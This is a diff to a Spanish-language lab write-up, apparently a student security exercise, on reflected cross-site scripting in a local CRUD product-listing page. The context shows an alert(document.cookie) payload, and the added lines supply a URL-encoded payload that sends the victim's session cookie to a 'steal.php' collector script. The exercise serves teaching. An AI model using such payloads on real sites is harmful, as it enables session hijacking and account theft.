@@ -60,6 +60,10 @@ Esta seria una forma de obtener la cookie de sesion que podria usar un atacante 
 
 http://localhost/FrontEnd/Crud/ListadoDeProductos.php?search=<script>alert(document.cookie);</script>
 
+- Si queremos que la cookie de sesion se almacene en un archivo para poder robarla, el usuario debera ejecutar este enlace
+
+http://localhost/FrontEnd/Crud/ListadoDeProductos.php?search=%3Cscript%3Edocument.location%3D%27http%3A%2F%2Flocalhost%2FFrontEnd%2FCrud%2Fsteal.php%3Fcookie%3D%27%2BencodeURIComponent(document.cookie)%3B%3C%2Fscript%3E
+
 
 Apartado 2 : Formulario con POST
 
